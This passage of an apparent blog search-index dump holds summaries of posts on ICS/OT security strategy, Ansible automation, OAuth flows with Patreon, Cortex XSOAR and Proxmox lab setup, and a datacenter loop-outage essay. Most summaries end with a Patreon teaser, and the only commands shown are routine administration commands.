vulnerabilities. Based on this assumption (which, in my experience, has always been true), we can develop our strategy.\nIn the IoT world, we can draw similar conclusions, with one complication: IoT systems are generally directly connected to the Internet, with all the associated consequences.\nDefense Strategies We\u0026rsquo;ve established that ICS/OT systems are vulnerable and unpatchable. In our vulnerability management plan, we can\u0026rsquo;t rely on patching. Instead, we need to build a series of layers to adequately reduce risk.\nFirst, I\u0026rsquo;d start with the so-called Purdue model, which provides a foundation for correctly approaching the problem. Generally, there should be no direct traffic from OT networks to IT/Internet networks and vice versa. The conditional \u0026ldquo;should\u0026rdquo; is necessary because, in my experience, the Purdue model is often not applicable today. I often find ICS/OT systems that have (contractual, not technical) requirements for direct Internet access.\nMy approach today is to create a particularly stringent security perimeter around the ICS/OT environment, inspired by the concept of ZTA (Zero Trust Architecture). Specifically, a combination of firewalls and IDS allows me to control access to ICS/OT systems and monitor any anomalies within the networks. It may sound simple, but consider that:\nMany ICS/OT systems reside together on large networks (I\u0026rsquo;ve seen thousands of IPs on a single 10.0.0.0/8 network). What we see isn\u0026rsquo;t necessarily what\u0026rsquo;s there (there are numerous 3/4/5G gateways implementing an independent, invisible Internet access point directly into the ICS/OT network). In many environments, VPN terminators are installed by contract, enabling remote assistance (and, once identified, these might be the lesser evil). ICS/OT security, therefore, involves an assessment to understand how chaotic the situation is and what possible paths exist.\nNetwork Segmentation We\u0026rsquo;ve seen some critical aspects to consider within a proper security strategy. One, in particular, deserves further discussion, though in most cases, it\u0026rsquo;s not feasible.\nWe\u0026rsquo;ve seen that ICS/OT systems within a company often reside on a single, large network. This means that compromising a single component exposes all systems to the same risk. We also know that ICS/OT systems are untouchable, and changing the addressing scheme isn\u0026rsquo;t an option. In this case, technologies that allow transparent segmentation of L2 networks can help. Personally, I\u0026rsquo;ve had experience with the VLAN Insertion feature offered by Palo Alto Networks. Different vendors have similar implementations with the same goal: to segment/micro-segment an L2 network transparently.\nThe reason I consider this security measure impractical is that the production world is often under the responsibility of the OT Manager, who comes from the OT world, not IT. I notice a certain skepticism, if not fear, when \u0026ldquo;IT technologies\u0026rdquo; are proposed in the OT world. The result is that the OT Manager opposes and shifts responsibility for any production downtime to those who alter the topology.\nIn some cases, I\u0026rsquo;ve seen people sit down and seek a compromise that satisfies all parties, but in many cases, no one wants to take the risk of changing the status quo, and everything remains the same.\nNetwork Access Previously, we discussed how to segment ICS networks to reduce the impact in case of a breach. Now, let\u0026rsquo;s touch on a topic that is both trendy and delicate. The idea behind NAC solutions is to enable network access for permitted devices while keeping out all others. However, there are some important considerations to keep in mind:\nThe fact that a device is allowed access does not reduce the possibility of it being compromised; Today\u0026rsquo;s NAC solutions rely on the 802.1x protocol and a series of compromises when this protocol cannot be used. In the ICS world, most devices (if not all) do not support 802.1x, which necessitates compromises such as MAB (MAC Authentication Bypass). Additionally, it is important to consider the risk posed by \u0026ldquo;silent\u0026rdquo; devices, those that tend to receive traffic more than send it. \u0026ldquo;Silent\u0026rdquo; devices might require further compromises.\nI am not demonizing NAC solutions, but I would like to emphasize that security is built in layers, and NAC solutions are just one layer. Like any security measure, they come with their own impacts. You can find more reflections on this topic in the \u0026ldquo;802.1x bypass\u0026rdquo; episode of the podcast I host with podcast.\nCode Security Finally, I want to address a still very niche topic (unfortunately): the security of code in the context of PLCs. We know that some vulnerabilities related to PLCs are caused by how they are programmed. We can address this, or rather prevent it, by writing correct code. This is not my area of expertise, so I will leave you with the Top 20 Secure PLC Coding Practices and encourage you to follow Sarah Flucks on LinkedIn.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2024/09/05/ics/ot/iot-security-challenges-and-protection-strategies/","title":"ICS/OT/IoT Security: challenges and protection strategies"},{"categories":["learning-paths","automation"],"contents":"Variables in Ansible can be defined in various ways, offering flexibility in managing configuration and customizing playbooks.\nDefining Variables in the Playbook: one simple and direct way to define variables is to include them directly in the playbook:\nIn this example, the variables ntp_server_1 and ntp_server_2 are defined within the playbook itself.\nDefining Variables in a Configuration File: to keep playbooks cleaner and manage configuration separately, variables can be defined in an external file:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/09/01/defining-and-using-variables-in-ansible/","title":"Defining and using variables in Ansible"},{"categories":["learning-paths","automation"],"contents":"Embark on a journey to elevate your network engineering skills by choosing the right path in network automation. Whether you\u0026rsquo;re looking to automate firewall management with Palo Alto Networks, streamline configurations with Ansible, or delve into advanced network emulation with UNetLab, this learning path has you covered. Tailored for IT professionals and network engineers, each series offers comprehensive knowledge and practical experience to help you master automation techniques and enhance your career in network operations. Select the series that aligns with your goals and take your network automation skills to the next level.\nFundamentals of network automation series : we\u0026rsquo;ll explore the core principles of network automation, essential tools, and practical techniques to streamline your network operations. Whether you\u0026rsquo;re new to the field or looking to sharpen your skills, our posts will provide the foundational knowledge you need to succeed. Ansible automation series : unlock exclusive content focused on mastering Ansible for network automation. Dive into detailed tutorials and real-world use cases that will help you streamline your network configurations and automate complex tasks with ease. Stay ahead of the curve with practical insights and hands-on experience that will transform your approach to network management. Cisco automation series : a comprehensive series of posts detailing how to automate Cisco solutions, covering best practices, tools, and techniques to streamline network management, improve efficiency, and reduce manual tasks. Nautobot automation series : gain exclusive access to content that will elevate your network management skills. Stay ahead of the curve and become proficient in using Nautobot for network automation. OT/ICS series : focus on Operational Technology (OT) and Industrial Control Systems (ICS), covering lab setups, security best practices, hands-on learning experiences, and insights into securing and managing critical infrastructure. Palo Alto Networks automation series : gain exclusive access to advanced content focused on automating Palo Alto Networks solutions. Explore in-depth tutorials and practical applications for automating firewall management, leveraging Cortex XDR for extended detection and response, and integrating Cortex XSOAR for security orchestration and automation. Threat Intelligence automation series : automating threat intelligence is transforming cybersecurity by quickly detecting and responding to threats. This series explores how automation can enhance threat detection, improve response times, and strengthen your overall security strategy. UNetLab v3 development series : gain exclusive access to a hands-on journey through the development of UNetLab. Follow along as we take you step by step through the evolution of this powerful network emulation tool. Get Started Today By joining this Patreon series, you\u0026rsquo;ll gain exclusive access to content that will elevate your network management skills. Thank you for your support! Let\u0026rsquo;s embark on this journey to revolutionize network automation.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/29/choose-your-learning-path-unlock-the-power-of-automation/","title":"Choose your learning path: unlock the power of automation"},{"categories":["learning-paths","automation"],"contents":"In the previous post, we covered how to implement the Authorization Code flow (3-legged) using the OAuth 2.0 Framework. Now, let\u0026rsquo;s explore a practical example of the Client Credentials flow (2-legged).\nPatreon We\u0026rsquo;ll continue using Patreon as our platform, building on what we discussed earlier.\nFirst, we need to register a new application on Patreon. Go to Clients \u0026amp; API Keys -\u0026gt; Create Client:\nName: Test API Description: Testing API via OAuth App Category: Member Benefits Redirect URIs: http://localhost:5000/callback Client API Version: 2 Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/26/oauth-client-credentials-flow-with-patreon/","title":"OAuth Client Credentials flow with Patreon"},{"categories":["learning-paths","automation"],"contents":"In our previous post, we introduced the OAuth 2.0 Framework. Now, let\u0026rsquo;s dive into a practical example using the Authorization Code flow (3-legged).\nThe term \u0026ldquo;authorization code\u0026rdquo; refers to the fact that, in the process, we exchange a temporary token (authorization code) for an access token, which will grant us access to protected resources.\nPatreon Integration Our example focuses on Patreon , where we aim to automate certain tasks using Patreon\u0026rsquo;s API. According to the documentation , authentication must be done via OAuth, and the full procedure for OAuth implementation is outlined there.\nRegistering a New Application First, we need to register a new application on Patreon. Head over to Clients \u0026amp; API Keys -\u0026gt; Create Client:\nName: Test API Description: Testing API via OAuth App Category: Member Benefits Redirect URIs: http://localhost:5000/callback Client API Version: 2 After confirming, your client application should look like this:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/24/oauth-authorization-code-flow-with-patreon/","title":"OAuth Authorization Code flow with Patreon"},{"categories":["learning-paths","automation"],"contents":"In this post, we\u0026rsquo;ll delve into some key concepts of the OAuth 2.0 Authorization Framework . Understanding OAuth 2.0 is crucial for working with APIs that are protected by this mechanism. OAuth 2.0 defines four main roles:\nResource Owner: the entity (often a person) that grants access to a protected resource. Resource Server: the server hosting the protected resource. Client: the application that needs to access a protected resource and is authorized by the resource owner. Authorization Server: the server that issues an access token to the client after the resource owner has authenticated and authorized the client\u0026rsquo;s access to the protected resource. From our perspective, the resource server and authorization server can be a single entity and typically exist within the same security perimeter.\nOAuth 2.0 supports various workflows, known as grant types. Four types of workflows are defined, but two are the most commonly used:\nAuthorization Code (3-legged): Preferred when the client is a web application running on a server and the resource server is owned by a third party. Client Credentials (2-legged): Necessary for machine-to-machine interactions. In this scenario, the client is also the resource owner, meaning no user authorization is needed. Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/21/diving-into-oauth-2.0/","title":"Diving into OAuth 2.0"},{"categories":["learning-paths","automation"],"contents":"In this post, we\u0026rsquo;ll set up the classification feature, which allows us to transform events into specific incident types. This guide expands on the content covered in the videos XSOAR Engineer Training - Part 2: Incident Types \u0026amp; Fields and XSOAR Engineer Training - Part 3: Classification and Mapping .\nSet Up Incident Classifier Navigate to Settings -\u0026gt; Objects Setup -\u0026gt; Classification \u0026amp; Mapping -\u0026gt; New Incident Classifier. At the top, select the JSONSampleIncidentGenerator_url_events instance we created in the previous post. This allows us to work with sample events.\nOn the right, you\u0026rsquo;ll see a list of existing incident types in XSOAR:\nThere\u0026rsquo;s already a PAN-OS URL Log Incident type, but since our events don\u0026rsquo;t originate from PAN-OS, we\u0026rsquo;ll create a new incident type specific to the data we\u0026rsquo;re analyzing.\nGo to Settings -\u0026gt; Objects Setup -\u0026gt; Incidents -\u0026gt; Types and select PAN-OS URL Log Incident. Use the Detach button to modify the object and explore its structure. After making your changes, click Reattach to restore the original state.\nCreate a New Incident Type Create a new incident type with the following settings:\nName: URL Alerts Run playbook automatically: Set (best practice) Post process using: Unset (script executed before closing the incident) Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/19/configuring-incident-classification-in-cortex-xsoar/","title":"Configuring Incident Classification in Cortex XSOAR"},{"categories":["learning-paths","automation"],"contents":"A playbook is a YAML file that sequentially outlines the operations to be performed on devices or groups of devices. Each playbook is composed of one or more plays, which can include pre_tasks, tasks, and post_tasks.\nWhen planning and writing playbooks, variables play a crucial role. These variables can be defined at different levels, such as configuration, playbook, inventory, environment, files, or facts. It\u0026rsquo;s helpful to have a method for printing the value of all defined variables.\nLet\u0026rsquo;s start by opening the Cisco Legacy Core-Access topology lab and ensuring all devices are active and reachable.\nPrinting All Variables As we know, a playbook is a YAML file containing a list of plays. Each play defines the operations to be performed and where they should be executed:\nThe example above defines a play with a general list of pre_tasks, tasks, and post_tasks. This play runs on all inventory objects (all) and collects facts before executing any tasks. Although gathering facts can slow down the play, it\u0026rsquo;s essential for our purpose.\nThe first line, known as the \u0026ldquo;shebang,\u0026rdquo; allows the playbook file to be executed directly without specifying the ansible-playbook interpreter manually. As the name suggests, pre_tasks and post_tasks group tasks that need to be executed before any other tasks or just before finishing the play, respectively. In this example, we\u0026rsquo;ll focus only on the tasks.\nThe playbook\u0026rsquo;s goal is defined by the hosts key, which can select all hosts in the inventory (all), specific groups, or individual hosts. Here are some examples:\nall: selects all hosts in the inventory; r1.example.com: selects only R1; routers,switches: selects hosts in the routers or switches groups; routers,!switches: selects hosts in the routers group but not in the switches group. Now, let\u0026rsquo;s write a playbook to print all environment variables. The variables we want to print are grouped into:\nModule variables (vars) Environment variables (environment) Group names variables (group_names) Groups variables (groups) Host variables (hostvars) We\u0026rsquo;ll define five tasks to print these variables:\nEach task uses the ansible.builtin.debug module to define the msg variable, which is set to the contents of vars, environment, group_names, groups, and hostvars.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/08/15/ansible-playbooks-and-variables/","title":"Ansible Playbooks and variables"},{"categories":["learning-paths","automation"],"contents":"This series of Patreon posts dives deep into the automation of Palo Alto Networks devices and software, offering you a comprehensive guide to streamlining and optimizing your security operations. Throughout the series, we explore how to automate various components, including firewalls, Cortex XDR, and Cortex XSOAR, to enhance your network security and incident response capabilities.\nBy the end of this series, you\u0026rsquo;ll have a solid understanding of how to leverage automation across Palo Alto Networks\u0026rsquo; solutions, enabling you to enhance your security posture while saving valuable time and resources. Whether you\u0026rsquo;re new to automation or looking to refine your skills, these posts provide practical insights and actionable steps to take your security operations to the next level.\nMastering Cortex XSOAR We delve into automating incident response with Cortex XSOAR. We guide you through setting up automated playbooks, integrating third-party tools, and managing the entire incident lifecycle to reduce manual efforts and improve response times.\n01. Introducing Cortex XSOAR 02. Setting Up Your Cortex XSOAR Lab Environment 03. Configuring Incident Classification in Cortex XSOAR \u0026hellip; Firewall automation: enhancing security and efficiency Palo Alto firewall automation streamlines network security management by leveraging APIs, scripts, and tools like Ansible, Terraform, and PAN-OS automation features. With automation, organizations can efficiently deploy, configure, and update firewall policies, reducing manual errors and response times to threats. Integrating automation with SIEM and SOAR platforms further enhances threat detection and mitigation. This approach not only improves security posture but also boosts operational efficiency, making it easier to manage complex and dynamic network environments.\nIntroduction to Palo Alto firewall automation Automating Palo Alto Firewall via CLI Automating Palo Alto Firewall via XML API Automating Palo Alto Firewall via REST API Automating Palo Alto Firewall via Python PAN-OS SDK Automating Palo Alto Firewall via Python PAN SDK Industrial network segmentation with VLAN Insertion Automating Palo Alto cloud based services Palo Alto Networks\u0026rsquo; cloud solutions enable centralized, API-driven management across multi-cloud and hybrid environments. Using REST APIs, SDKs, and tools like Terraform or Ansible, teams can automate policy deployment, configuration, and monitoring at scale. This approach ensures consistent security, faster provisioning, and reduced operational overhead in dynamic, distributed networks.\nAutomating operations with Strata Cloud Manager Authenticating to the Strata Cloud Manager API Optimizing Strata Cloud Manager API usage (paid members only) Retrieving firewall interfaces with Strata Cloud Manager Modifying an object in Strata Cloud Manager Creating an interface in Strata Cloud Manager Get Started Today By joining this Patreon series, you\u0026rsquo;ll gain exclusive access to advanced content focused on automating Palo Alto Networks solutions. Explore in-depth tutorials and practical applications for automating firewall management, leveraging Cortex XDR for extended detection and response, and integrating Cortex XSOAR for security orchestration and automation.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2024/08/13/palo-alto-networks-automation-series/","title":"Palo Alto Networks automation series"},{"categories":["learning-paths","automation"],"contents":"Cortex XSOAR is a comprehensive orchestration and automation system that unifies all the components of your security infrastructure. It seamlessly integrates with your third-party security and incident management vendors, allowing you to trigger events that automatically become incidents within Cortex XSOAR.\nOnce these incidents are created, Cortex XSOAR enables you to run playbooks that enrich the incidents with valuable information from other connected products. This enriched data helps you build a complete picture of the situation, ensuring that nothing is overlooked.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/12/introducing-cortex-xsoar/","title":"Introducing Cortex XSOAR"},{"categories":["learning-paths","automation"],"contents":"In this post, we\u0026rsquo;ll guide you through setting up a lab environment for experimenting with Palo Alto Networks\u0026rsquo; Cortex XSOAR. This tutorial aligns with the content from the video XSOAR Engineer Training - Part 2: Incident Types \u0026amp; Fields .\nDownload and Install Cortex XSOAR* Start by downloading the trial version of XSOAR. You\u0026rsquo;ll receive a file, approximately 1GB in size, named something like demistoserver-6.12-857430.sh. This file needs to be copied to a Linux system. I\u0026rsquo;m using Ubuntu Linux 22.04 for this setup.\nRun the installation with the root user:\nbash /tmp/demistoserver-6.12-857430.sh Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/12/setting-up-your-cortex-xsoar-lab-environment/","title":"Setting Up Your Cortex XSOAR Lab Environment"},{"categories":["learning-paths","automation"],"contents":"Ansible typically works out-of-the-box without requiring additional configuration. However, advanced usage might necessitate some customization. Ansible can be configured through files or variables.\nFor example, the DEFAULT_HOST_LIST parameter defines the inventory file. The official documentation specifies:\nDefault: The default value if not specified otherwise (/etc/ansible/hosts). INI: How to specify the parameter in an INI configuration file (in this case, the section is [defaults] and the parameter is inventory). Environment: The environment variable name to specify this parameter (ANSIBLE_INVENTORY). If you choose to configure Ansible via INI files, you have four options:\nUse the file at /etc/ansible/ansible.cfg Use the file ~/.ansible.cfg in the home directory Use the file ./ansible.cfg in the current directory Use the file defined by the ANSIBLE_CONFIG environment variable The DEFAULT_HOST_LIST parameter can also be specified on the command line with -i. Additionally, some parameters can be defined within a playbook.\nAnsible uses a precedence to determine which parameter value to use if it is specified multiple times. The order is:\nConfiguration settings Command-line options Playbook keywords Variables Lower items in the list override higher ones.\nThere are handy utilities to get general and specific information about your environment:\nansible-config list: Lists all possible variables and how to configure them. ansible-config dump: Prints current values for each variable. ansible-config init \u0026gt; ansible.cfg: Creates a sample configuration file, comprehensive but complex. ansible-config view: Verifies and prints the current configuration. Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/08/05/ansible-configuration/","title":"Ansible configuration"},{"categories":["learning-paths","automation"],"contents":"Let\u0026rsquo;s explore how Proxmox\u0026rsquo;s SDN functionality works. We\u0026rsquo;ll use the SDN structure to implement extended L2 networks, enabling us to run labs across multiple hosts.\nCreate an SDN Zone First, create a zone:\npvesh create /cluster/sdn/zones -type=vxlan -zone=unlzone1 -peers=172.25.82.157,172.25.82.158 -ipam=pve pvesh set /cluster/sdn/zones In the peers list, add all the IP addresses of the Proxmox hosts.\nCreate a Bridge Associated with the Zone Next, create a bridge linked to the zone for connecting the nodes:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/08/04/testing-stretched-networks-with-proxmox/","title":"Testing stretched networks with Proxmox"},{"categories":["learning-paths","automation"],"contents":"Ansible provides a way to execute single commands without the need to build playbooks. This mode is called ad hoc and can be useful for executing one-time commands in very specific scenarios.\nLet\u0026rsquo;s open the Simple Network Lab and start R1. Ensure that the router is active and reachable:\nping -c3 169.254.1.21 If it is not, connect to the console and ensure that it is powered on, configured, and has the correct IP address.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/08/03/ansible-ad-hoc-commands/","title":"Ansible ad hoc commands"},{"categories":["learning-paths","automation"],"contents":"The inventory is the source of truth containing the information that Ansible will use to connect to devices. The inventory also allows defining variables at the host or group level. Particularly, variables can be used, in advanced scenarios, to define all infrastructure parameters, such as interfaces, IP addresses, router ID, etc.\nAnsible supports both static and dynamic inventories. The static inventory is defined by a file in INI or YAML format, while the dynamic inventory is an executable that prints JSON to standard output.\nWe must also pay attention to selecting the correct protocol for communication with remote devices and the correct platform based on the device. In the upcoming examples, we will connect to Cisco IOS devices, which require executing commands via an SSH connection. In this regard, we need to set:\nansible_connection: network_cli, indicating that we will use CLI over an SSH channel; ansible_network_os: ios, indicating that we will use the module written for Cisco IOS devices. Initially, we assume that we can log in with a privileged user. We will address how to manage non-privileged users later.\nStatic Inventory in INI Format The static inventory in INI format has the following structure:\nAll devices should be part of group all then he can be inserted into additional groups. We can also define host level or group level vars.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/08/02/ansible-inventory/","title":"Ansible inventory"},{"categories":["learning-paths","automation"],"contents":"Ansible is often described as an agentless automation framework. However, it relies on Python, which must be installed along with certain modules on the hosts where playbooks are executed. In this sense, Python acts as the necessary \u0026ldquo;agent\u0026rdquo; on the remote system.\nOriginally designed to automate Linux hosts, Ansible has expanded to support various systems, including Windows, networking devices, and security appliances.\nIn this series, we\u0026rsquo;ll focus on using Ansible for automating network devices. For these purposes, Ansible truly functions in an agentless manner.\nDeclarative vs. Procedural There are two main approaches to automation: declarative and procedural.\nDeclarative Approach: You define the desired state of a system. The automation system figures out the steps to transition the current state to the desired state. Terraform is a popular example of this approach. Procedural Approach: You specify the exact steps the automation system must take to achieve the desired state. This method is generally more intuitive as it follows the human thought process of breaking tasks into smaller sub-tasks. Troubleshooting is also simpler due to the absence of underlying \u0026ldquo;magic.\u0026rdquo; Ansible is a prime example of this approach. Ansible is often considered a hybrid system because some modules allow for declaring a desired state, which Ansible then translates into multiple sub-tasks. For instance, the community.vmware.vmware_guest module can create a virtual machine in a single task (declarative), but the VM depends on a pre-existing vSwitch (procedural).\nThere\u0026rsquo;s also a third concept to consider: immutability. An immutable approach involves defining instances that cannot be modified. Any change requires redefining the instance from scratch. This approach is common in container management and can be applied to network automation through golden configurations.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/08/01/introduction-to-ansible-automation/","title":"Introduction to Ansible Automation"},{"categories":["infrastructure"],"contents":"In 2013, I presented a critical case that could cause a complete isolation of a datacenter. Eleven years later, the situation remains the same.\nLet\u0026rsquo;s reflect on a few points.\nOpen Reflections Complexity: Complexity has increased, with many more software layers than before. This complexity leads to misunderstandings, design errors, or unforeseen \u0026ldquo;blind spots\u0026rdquo; that can be particularly destructive. The term \u0026ldquo;complexity\u0026rdquo; has become a mantra, but we have brought it upon ourselves.\nSimplification: Paradoxically, it is the opposite of the previous mantra and has been the driving force behind the introduction of various technologies to enable \u0026ldquo;things\u0026rdquo; previously deemed incorrect. For those who remember, STP was created this way. To simplify processes and make them more agile and faster, a series of software layers were introduced, leading to the previous point.\nHybrid Devices: Thanks to the two previous mantras, devices that behave partly like hosts and partly like switches were born. In the slides, I specifically refer to embedded devices in blade chassis. I described a corner case on HP in the slides, but this scenario is still valid for other vendors.\nThe Scenario Let\u0026rsquo;s discuss the scenario at hand.\nThe scenario involves a datacenter network that can be implemented in legacy mode or via fabric. Connected to this network are blade chassis with the aforementioned hybrid devices. Virtualization systems are generally running on the blades, but this is not strictly necessary. If, for any reason, a blade creates an L2 loop, in the absence of protections, the loop propagates through the fabric and all connected devices and chassis.\nIn the three cases I have experienced from 2013 to today, the fabric generally handles the traffic, but the hybrid switches do not. If the hybrid switches transport FCoE, the damage is obviously greater.\nBest practices generally require configuring protection mechanisms on the fabric, which introduces the problem.\nAs explained in the slides, if a blade or VM creates a real or apparent loop, it activates the fabric\u0026rsquo;s protection mechanism, shutting down the port from which the loop originates. However, the failover mechanism of the virtualizer or hybrid switches moves the loop cause to a different interface, which is also shut down to protect the fabric. In a few minutes or seconds, the entire blade chassis is isolated along with its entire workload.\nThe problem is that, as network engineers, we tend to protect \u0026ldquo;the fabric\u0026rdquo; without realizing that the fabric actually extends to hybrid switches and virtual switches of the virtualizer. Complexity leads to segmenting the infrastructure into different themes: the fabric is the network team\u0026rsquo;s responsibility, while blades and virtualization belong to the computing team. According to this logic, the network team protects its perimeter from its perspective, which is incomplete.\nThe solution should involve implementing loop protection mechanisms at the fabric\u0026rsquo;s edge, considering it as a whole, to isolate the single VM (or server) causing the loop, rather than the entire blade chassis.\nFinal Notes Some final notes:\nThe loop prevention mechanism should be handled by the access switch closest to the potential loop source (which can be VMs or servers). The loop prevention mechanism should include some sort of probe. Not all loops can be identified via BPDU guard. The described scenario can also occur due to virtualizers installed on rack servers, not just blades. To date, I have only observed human errors/bugs, but if I were to plan an effective DOS, I would consider it. We cannot prevent 100% of problems; we can only improve our ability to identify and respond to them quickly. ","cover":"/images/categories/infrastructure.webp","permalink":"https://www.adainese.it/blog/2024/07/31/network-outage/","title":"Network outage"},{"categories":["learning-paths","automation"],"contents":" Ansible , based on Python , can be easily installed using the package manager PIP . The functionalities of Ansible available obviously depend on its version, which is closely tied to the version of Python in use. The examples we will see later presume having Ansible core 2.15.9, and Python 3.10.\nIn this regard, reference should be made to the EVE-NG for DevNetOps , which describes in detail how to obtain your own development laboratory. In particular, we will refer to the GitHub repository for DevNetOps courses available in /opt.\nLet\u0026rsquo;s prepare a dedicated Python environment and install Ansible:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/07/31/preparing-your-ansible-environment/","title":"Preparing your Ansible environment"},{"categories":["learning-paths","automation"],"contents":"In this series, we\u0026rsquo;ll explore the core principles of network automation, essential tools, and practical techniques to streamline your network operations. Whether you\u0026rsquo;re new to the field or looking to sharpen your skills, our posts will provide the foundational knowledge you need to succeed. Join us on Patreon and transform the way you manage your network!\nTheory, Design, and Approach Network automation is transforming IT operations, but the journey from theory to implementation requires a solid foundation in both design and approach. Review principles of efficient network design, practical strategies for configuration management, and frameworks for scalable, adaptable solutions.\n01. Key steps for Real-World success 02. Simplifying the Data Structure 03. Review of SNMP Fundamentals 04. Parsing text with TextFSM 05. TextFSM: parsing non-tabular text (paid members only) 06. TextFSM: parsing tabular text (paid members only) Git Essentials: A Step-by-Step Guide to Version Control Basics Learn the fundamentals of Git, the powerful version control system used by developers worldwide. Perfect for beginners or those looking to solidify their understanding of Git basics!\n01. Git fundamentals for developers and IT professionals 02. Collaborating with Git by working with remote repositories and forks 03. Advanced Git commands 04. Contributing to NTC Templates with Git and GitHub (paid members only) Application Security with OAuth: Essential Insights Discover essential insights on application security and OAuth, from basic concepts to advanced practices, designed to help you secure your apps effectively.\n01. Diving into OAuth 2.0 02. OAuth Authorization Code flow with Patreon 03. OAuth Client Credentials flow with Patreon EVE-NG Workbook for DevNetOps Ready to build your network automation lab? In this path, we\u0026rsquo;ll show you how to set up EVE-NG, the powerful network emulator, to create an effective testing environment. Ideal for all skill levels.\n01. Introduction to EVE-NG platform 02. Prerequisites for EVE-NG 03. Installing Ubuntu Linux 04. Installing EVE-NG 5 05. Installing EVE-NG 6 06. Customizing EVE-NG 07. EVE-NG network interfaces explained 08. Troubleshooting EVE-NG nodes that fail to start 08. Automating EVE-NG installation (paid members only) 09. EVE-NG Linux VM SSH troubleshooting Other automation topics In this series of posts, we\u0026rsquo;ll dive into the world of automation, exploring how it can streamline processes, improve efficiency, and reduce manual workloads. From automating documentation workflows to implementing robust CI/CD pipelines, these posts cover a variety of topics aimed at helping you harness the power of automation in your own projects. Whether you\u0026rsquo;re looking to optimize your personal workflow or improve business operations, this series will provide practical insights and strategies to make automation work for you.\nSimplifying documentation with Markdown and CI/CD Writing presentations with Markdown Get Started Today By joining this Patreon series, you\u0026rsquo;ll gain exclusive access to content that will elevate your network management skills. Stay ahead of the curve and become proficient in using Nautobot for network automation.\nThank you for your support! Let\u0026rsquo;s embark on this journey to revolutionize network automation with Nautobot together.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/29/fundamentals-of-network-automation-series/","title":"Fundamentals of network automation series"},{"categories":["learning-paths","automation"],"contents":"Welcome to our series focused on Network Automation with Ansible! This series is designed to help you streamline operations, standardize workflows, and manage multiple devices in significantly less time. Network automation is no longer just the domain of network engineers; it is now expanding to include Governance, Risk, and Compliance (GRC) teams.\nWhile there are various frameworks available for automation, Ansible stands out as an excellent choice. It does not require programming skills, making it accessible with a relatively easy learning curve.\nOur Ansible Workbook for DevNetOps is a comprehensive guide for students in my network automation courses. It provides useful \u0026ldquo;recipes\u0026rdquo; to help you develop your own automations using Ansible. By the end of this series, you\u0026rsquo;ll be able to design and write Ansible playbooks to automate tasks across numerous network devices.\nObjectives Become familiar with Ansible terminology. Learn how to approach an automation project with Ansible. Understand the pros and cons of Ansible. Develop skills to write Ansible playbooks and roles. Prerequisites Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/07/28/introduction-to-network-automation-with-ansible/","title":"Introduction to network automation with Ansible"},{"categories":["learning-paths","automation"],"contents":"Welcome to our series focused on Ansible Automation! In this comprehensive series, we\u0026rsquo;ll delve into Ansible, an incredibly powerful tool designed to automate a wide range of IT tasks and streamline the management of complex deployments. From configuration management to application deployment, Ansible simplifies the orchestration of your IT infrastructure, allowing you to manage systems more efficiently and effectively.\nThroughout this journey, we\u0026rsquo;ll start with the basics and gradually move towards advanced topics, providing you with hands-on examples, best practices, and expert insights. Whether you\u0026rsquo;re new to automation or looking to enhance your existing skills, there\u0026rsquo;s something here for everyone.\nJoin us as we explore the world of Ansible and unlock the potential of automation together!\nAnsible Workbook for DevNetOps Whether you\u0026rsquo;re new to automation or looking to deepen your skills, this series will guide you through every step of mastering Ansible. From the basics to advanced techniques, we\u0026rsquo;ll cover everything you need to become proficient in automating IT tasks.\n01. Introduction to network automation with Ansible 02. Preparing your Ansible environment 03. Introduction to Ansible Automation 04. Ansible inventory 05. Ansible configuration (paid members only) 06. Ansible ad hoc commands (paid members only) 07. Ansible Playbooks and variables 08. Defining and using variables in Ansible 09. Ansible statements 10. Strategies for troubleshooting Ansible errors 11. Handling errors in Ansible playbooks 12. Using Ansible handlers for optimized task execution 13. Ansible parsers and filters 14. Password Management with Ansible 15. Enhancing Ansible output 16. Boosting Ansible performance (paid members only) 17. Running Ansible playbooks through a Bastion host (paid members only) 18. Key steps for Real-World success 19. Ansible orchestrators and integration tools 20. Key takeaways from the Ansible course 21. Comprehensive Ansible Lab (paid members only) A1. Managing CLI prompts with Ansible (paid members only) A2. Reboot a device with Ansible and wait for it to come online (paid members only) A3. Event-Driven Ansible (paid members only) A4. Ansible reporting with ARA (paid members only) A5. Orchestrating playbooks with Ansible AWX (paid members only) A6. Ansible Galaxy (paid members only) A7. Delegate Ansible tasks to a different host (paid members only) A8. Nautobot automation series Ansible Workbook for DevNetOps slides (paid memebers only) Get Started Today By joining this Patreon series, you\u0026rsquo;ll 